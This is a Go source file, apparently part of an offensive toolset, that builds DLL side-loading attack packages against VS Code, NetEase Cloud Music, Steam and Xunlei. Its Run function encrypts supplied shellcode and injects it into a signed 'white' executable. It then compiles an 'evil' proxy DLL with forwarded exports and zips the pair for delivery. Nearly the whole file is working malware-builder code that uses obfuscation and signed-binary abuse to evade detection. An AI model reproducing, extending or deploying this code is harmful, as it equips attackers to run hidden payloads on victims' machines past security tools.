package plugins

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
	"toolset/utils"
)

type DllHijackOptionItem struct {
	Type int `json:"type"`
	Name string `json:"name"`
	Runner RunnerIface `json:"-"` 
}

func DllHijackConfig() ([]DllHijackOptionItem) {
	return []DllHijackOptionItem{
		{
			Type: 1,
			Name: "(x86) vscode",
			Runner: NewPreloadDllHijackBase(new(PreloadDllHijackVscode)),
		},
		{
			Type: 2,
			Name: "(x86) 网易云",
			Runner: NewPreloadDllHijackBase(new(PreloadDllHijackCloudmusic)),
		},
		{
			Type: 3,
			Name: "(x86) steam",
			Runner: NewPreloadDllHijackBase(new(PreloadDllHijackSteam)),
		},
		{
			Type: 4,
			Name: "(x86) 迅雷升级程序",
			Runner: NewPreloadDllHijackBase(new(PreloadDllHijackXLLiveUD)),
		},
		{
			Type: 5,
			Name: "(x86) 迅雷",
			Runner: NewPreloadDllHijackBase(new(PreloadDllHijackThunder)),
		},
	}
}

// SubPluginPreloadDllHijackX86 给子组件提供编译dll的基础文件
type SubPluginPreloadDllHijackX86 struct {}

// GetFoundationPath 获取子组件的下级基础文件夹（用来构建dll）
func (p *SubPluginPreloadDllHijackX86) GetFoundationPath(pluginRootPath string) string {
	return filepath.Join(pluginRootPath, "preload_dll_hijack_x86")
}

// GetIsX64Arch 是否为64位
func (p *SubPluginPreloadDllHijackX86) GetIsX64Arch() (bool) {
	return false
}

// GetExtraFileList 获取额外的文件列表，某些情况下exe可能导入的dll不止一个，但我们只对其中一个进行劫持，其他的dll在该列表中体现
func (p *SubPluginPreloadDllHijackX86) GetExtraFileList() ([]string) {
	return nil
}

// PreloadDllHijackBase preload dll劫持插件基础抽象模块
type PreloadDllHijackBase struct {
	BasePlugin
	shellcode []byte
	subplugin SubPluginPreloadDllHijackIface
}

// SubPluginPreloadDllHijackIface 作为 PreloadDllHijackBase 的子组件来提供信息，使之成为一个完整的插件
type SubPluginPreloadDllHijackIface interface {
	GetFoundationPath(pluginRootPath string) string
	GetMainProgramName() string
	GetDllName() string
	GetPluginName() string
	GetIsX64Arch() bool
	GetDllExports() []string
	GetExtraFileList() ([]string)
}

// NewPreloadDllHijackBase 根据传入的子组件来创建一个完整的插件
func NewPreloadDllHijackBase(subPlugin SubPluginPreloadDllHijackIface) *PreloadDllHijackBase {
	p := &PreloadDllHijackBase{
		subplugin: subPlugin,
	}
	p.BasePlugin.PluginName = subPlugin.GetPluginName()
	return p
}

func (p *PreloadDllHijackBase) SetShellcdoe(shellcode []byte) {
	p.shellcode = shellcode
}

func (p *PreloadDllHijackBase) updateDefFile(defFilePath string, exports []string, dllName string) (err error) {
	data := map[string]interface{} {
		"DllName": dllName,
		"Exports": exports,
	}
	err = utils.UpdateTplFile(defFilePath, data, nil)
	return
}

func (p *PreloadDllHijackBase) buildEvilDll(workDir string, x64 bool, expPath string) ([]byte, error) {
	env := os.Environ()
	env = append(env, "GOOS=windows")
	env = append(env, "CGO_ENABLED=1")
	if x64 {
		env = append(env, "GOARCH=amd64")
		env = append(env, "CC=x86_64-w64-mingw32-gcc")
	} else {
		env = append(env, "GOARCH=386")
		env = append(env, "CC=i686-w64-mingw32-gcc")
	}
	// 初始化 mod
	cmd := exec.Command("go", "mod", "init", "output")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Dir = workDir
	cmd.Env = env
	err := cmd.Run()
	if err != nil {
		return nil, err
	}
	// 生成dll
	outputDll := filepath.Join(workDir, "output.dll")
	ldflags := fmt.Sprintf("-extldflags=-Wl,%s -s -w", expPath)
	cmd = exec.Command("go", "build", "-trimpath", "-o", outputDll, "-buildmode", "c-shared", "-ldflags", ldflags)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Dir = workDir
	cmd.Env = env
	err = cmd.Run()
	if err != nil {
		return nil, err
	}
	return ioutil.ReadFile(outputDll)
}

// updateMainGoFile 更新源代码文件
func updateMainGoFile(tag []byte, xorkey []byte, mainProgramName string, mainGoFilePath string) (err error) {
	// 暂时不启用xorkey
	data := map[string]interface{} {
		"Pattern": utils.TplBytes(tag),
		"MainProgram": mainProgramName,
		"FuncXorEncode": utils.TplStrXorEncode(),
	}
	funcs := template.FuncMap{
		"cryptStr": utils.TplFuncCryptStr,
	}
	err = utils.UpdateTplFile(mainGoFilePath, data, funcs)
	return
}

func (p *PreloadDllHijackBase) Run() ([]byte, error) {
	// 新建一个临时目录作为工作目录，并把所有的所需的基础文件拷贝过去
	tmpDir, err := p.buildTmpWorkDir()
	if err != nil {
		return nil, err
	}
	err = utils.CopyDir(p.subplugin.GetFoundationPath(p.GetRootPath()), tmpDir)
	if err != nil {
		return nil, err
	}
	// defer os.RemoveAll(tmpDir)
	// 更新def文件
	defPath := filepath.Join(tmpDir, "functions.def")
	err = p.updateDefFile(defPath, p.subplugin.GetDllExports(), p.subplugin.GetDllName())
	if err != nil {
		return nil, err
	}
	// 将def文件转为exp文件
	expPath := filepath.Join(tmpDir, "functions.exp")
	err = p.defToExp(p.subplugin.GetIsX64Arch(), defPath, expPath)
	if err != nil {
		return nil, err
	}
	// 生成加密处理后的 shellcode
	shellcodeData := utils.CustomEncryptData(p.shellcode)
	whiteExeName := fmt.Sprintf("%s.exe", p.subplugin.GetMainProgramName())
	whiteExePath := filepath.Join(tmpDir, whiteExeName)
	// 注入加密后的shellcode到exe
	tag, xorkey, err := utils.InjectShllcodeToSignExe(shellcodeData, whiteExePath)
	if err != nil {
		return nil, err
	}
	// 更新源码文件
	err = updateMainGoFile(tag, xorkey, whiteExeName, filepath.Join(tmpDir, "main.go"))
	if err != nil {
		return nil, err
	}
	// 进行转发dll编译
	evilDllData, err := p.buildEvilDll(tmpDir, p.subplugin.GetIsX64Arch(), expPath)
	if err != nil {
		return nil, err
	}
	// 读取白文件
	whiteExeData, err := ioutil.ReadFile(whiteExePath)
	if err != nil {
		return nil, err
	}
	// 读取额外的文件
	var files []utils.FileData
	for _, fname := range p.subplugin.GetExtraFileList() {
		extraFileData, err := ioutil.ReadFile(filepath.Join(tmpDir, fname))
		if err != nil {
			return nil, err
		}
		files = append(files, utils.FileData {
			Name: fname,
			Body: extraFileData,
		})
	}
	// 添加白程序和恶意dll
	files = append(files, utils.FileData {
		Name: whiteExeName,
		Body: whiteExeData,
	})
	files = append(files, utils.FileData {
		Name: fmt.Sprintf("%s.dll", p.subplugin.GetDllName()),
		Body: evilDllData,
	})
	zipPath, err := utils.ZipData(files)
	if err != nil {
		return nil, err
	}
	defer os.Remove(zipPath)
	return ioutil.ReadFile(zipPath)
}